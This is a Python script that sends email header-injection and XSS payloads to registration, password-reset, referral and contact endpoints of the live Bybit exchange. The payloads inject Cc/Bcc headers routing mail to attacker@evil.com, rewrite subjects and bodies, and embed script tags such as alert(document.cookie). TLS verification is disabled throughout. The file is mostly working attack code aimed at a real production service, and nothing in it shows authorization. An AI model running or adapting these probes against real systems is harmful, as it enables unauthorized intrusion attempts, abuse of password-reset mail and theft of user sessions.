#!/usr/bin/env python3
"""
Email/Notification Injection Testing
Common in:
- Registration emails
- Password reset
- 2FA codes
- Referral invitations
- Trading notifications
"""
import requests
import time

BASE_URL = "https://www.bybit.com"
API_URL = "https://api.bybit.com"
requests.packages.urllib3.disable_warnings()

print("="*80)
print("EMAIL/NOTIFICATION INJECTION TESTING")
print("="*80)

# Email injection payloads
email_payloads = [
    # Header injection
    "victim@test.com%0ACc:attacker@evil.com",
    "victim@test.com%0d%0aBcc:attacker@evil.com",
    "victim@test.com\nCc:attacker@evil.com",
    
    # Subject injection  
    "victim@test.com%0d%0aSubject:HACKED",
    
    # Body injection
    "victim@test.com%0d%0a%0d%0aYou have been hacked!",
    
    # HTML injection in email body
    "test+<script>alert(1)</script>@test.com",
    "test+<img src=x onerror=alert(1)>@test.com",
]

# Test registration endpoint
print("\n[1] Testing Registration Email Injection")
print("-" * 80)

registration_endpoints = [
    "/api/user/register",
    "/api/v1/user/register",
    "/user/register",
    "/register",
]

for endpoint in registration_endpoints:
    for payload in email_payloads[:2]:  # Test first 2
        try:
            data = {
                "email": payload,
                "password": "Test123!@#",
                "username": "testuser"
            }
            
            r = requests.post(
                f"{API_URL}{endpoint}",
                json=data,
                verify=False,
                timeout=3
            )
            
            # Check response
            print(f"\nEndpoint: {endpoint}")
            print(f"Payload: {payload}")
            print(f"Status: {r.status_code}")
            
            if r.status_code == 200:
                try:
                    resp = r.json()
                    if resp.get('retCode') == 0:
                        print(f"  🚨 Email accepted! Check if injection worked")
                except:
                    pass
                    
        except:
            pass

# Test password reset
print("\n\n[2] Testing Password Reset Email Injection")
print("-" * 80)

reset_endpoints = [
    "/api/user/forgot-password",
    "/api/v1/user/reset-password",
    "/forgot-password",
]

for endpoint in reset_endpoints:
    for payload in email_payloads[:1]:
        try:
            data = {"email": payload}
            
            r = requests.post(
                f"{API_URL}{endpoint}",
                json=data,
                verify=False,
                timeout=3
            )
            
            if r.status_code not in [404, 403]:
                print(f"\n{endpoint}: {r.status_code}")
                try:
                    print(f"  Response: {r.json()}")
                except:
                    print(f"  Text: {r.text[:100]}")
                    
        except:
            pass

# Test referral system
print("\n\n[3] Testing Referral Email Injection")
print("-" * 80)

referral_endpoints = [
    "/api/referral/invite",
    "/api/v1/referral/send",
    "/referral/invite",
]

# Would need auth, but let's try
for endpoint in referral_endpoints:
    try:
        data = {
            "email": "test%0ACc:attacker@evil.com@test.com"
        }
        
        r = requests.post(
            f"{API_URL}{endpoint}",
            json=data,
            verify=False,
            timeout=3
        )
        
        if r.status_code != 404:
            print(f"\n{endpoint}: {r.status_code}")
            
    except:
        pass

# Test notification preferences (potential XSS in emails)
print("\n\n[4] Testing XSS in Email Templates")
print("-" * 80)

xss_payloads = [
    "test+<script>alert(document.cookie)</script>@test.com",
    "test+<img src=x onerror=alert(1)>@test.com",
    'test+"<svg/onload=alert(1)>@test.com',
]

print("""
To test XSS in emails properly:
1. Register with XSS payload in username/email
2. Trigger email (password reset, 2FA, etc)
3. Check if payload executes when viewing email in webmail
4. This requires manual verification
""")

# Test SMTP header injection via Contact Form
print("\n\n[5] Testing Contact/Support Form")
print("-" * 80)

contact_endpoints = [
    "/api/support/contact",
    "/api/contact",
    "/contact/submit",
]

for endpoint in contact_endpoints:
    try:
        data = {
            "email": "test%0ACc:attacker@evil.com@test.com",
            "subject": "Test%0ABcc:attacker@evil.com",
            "message": "Test message"
        }
        
        r = requests.post(
            f"{BASE_URL}{endpoint}",
            json=data,
            verify=False,
            timeout=3
        )
        
        if r.status_code not in [404, 403]:
            print(f"\n{endpoint}: {r.status_code}")
            try:
                print(f"  Response: {r.json()}")
            except:
                pass
                
    except:
        pass

print("\n" + "="*80)
print("EMAIL INJECTION TESTING COMPLETE")
print("\nNote: Most email injection requires manual verification")
print("Check if emails contain injected headers/content")
print("="*80)
